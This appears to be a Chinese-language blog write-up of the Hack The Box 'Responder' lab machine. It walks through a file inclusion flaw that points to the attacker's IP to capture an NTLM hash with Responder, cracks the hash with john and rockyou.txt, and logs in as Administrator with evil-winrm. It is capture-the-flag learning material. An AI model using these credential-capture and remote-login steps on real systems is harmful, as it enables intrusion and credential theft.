---
title: HTB-Responder
description: 'Hack the box'
pubDate: 2024-02-28 
image: /hackthebox/Responder.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Windows Machine
---

测出网页存在文件包含漏洞

<font style="color:rgb(77, 77, 77);">我们可以使用responder -I tun0，监听tun0网卡, 为获得登录信息</font>

<font style="color:rgb(77, 77, 77);">根据题目给出的远程文件//10.10.14.6/somefile，把地址改为自己机器的地址，进行访问</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709105529211-7ef8c416-9b6d-4427-9198-21f7a09076e2.png)

<font style="color:rgb(77, 77, 77);">得到一串hash值</font>

<font style="color:rgb(77, 77, 77);">将这串内容复制，保存到一个新文件中</font>

<font style="color:rgb(77, 77, 77);">使用john对其进行破解</font>

**<font style="color:rgb(77, 77, 77);">john --wordlist=/usr/share/wordlists/rockyou.txt responder</font>**

**<font style="color:rgb(77, 77, 77);">--wordlist </font>**<font style="color:rgb(77, 77, 77);">用来指定字典</font>

<font style="color:rgb(77, 77, 77);">得到密码:badminton</font>

<font style="color:rgb(77, 77, 77);">ps:（</font>**<font style="color:rgb(13, 13, 13);">responder -I tun0</font>**<font style="color:rgb(13, 13, 13);"> 是一个网络攻击工具，用于在指定的网络接口（这里是 tun0）上监听网络流量，并尝试获取凭据信息，比如用户名和密码等。</font><font style="color:rgb(77, 77, 77);">）</font>

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">WinRM(Windows Remote Management)windows远程管理，这个是基于powershell的功能</font>

<font style="color:rgb(77, 77, 77);">检测 WinRM 是否可用的最简单方法是查看端口是否打开, 如果这两个端口有一个打开：</font>

<font style="color:rgb(77, 77, 77);">5985/tcp (HTTP)</font>

<font style="color:rgb(77, 77, 77);">5986/tcp (HTTPS)</font>

<font style="color:rgb(77, 77, 77);">说明WinRM已配置，可以尝试进入远程会话</font>

<font style="color:rgb(77, 77, 77);">使用</font>**<font style="color:rgb(77, 77, 77);">evil-winrm</font>**<font style="color:rgb(77, 77, 77);">对目标进行连接</font>

<font style="color:rgb(77, 77, 77);">输入:</font>**<font style="color:rgb(77, 77, 77);"> evil-winrm -i 10.129.218.203 -u Administrator -p badminton</font>**

<font style="color:rgb(77, 77, 77);">连接成功</font>

<font style="color:rgb(77, 77, 77);">使用</font>**<font style="color:rgb(77, 77, 77);">dir</font>**<font style="color:rgb(77, 77, 77);">可以查看当前目录下存在哪些文件</font>

<font style="color:rgb(77, 77, 77);">使用</font>**<font style="color:rgb(77, 77, 77);">cd .. </font>**<font style="color:rgb(77, 77, 77);">返回上一级目录</font>





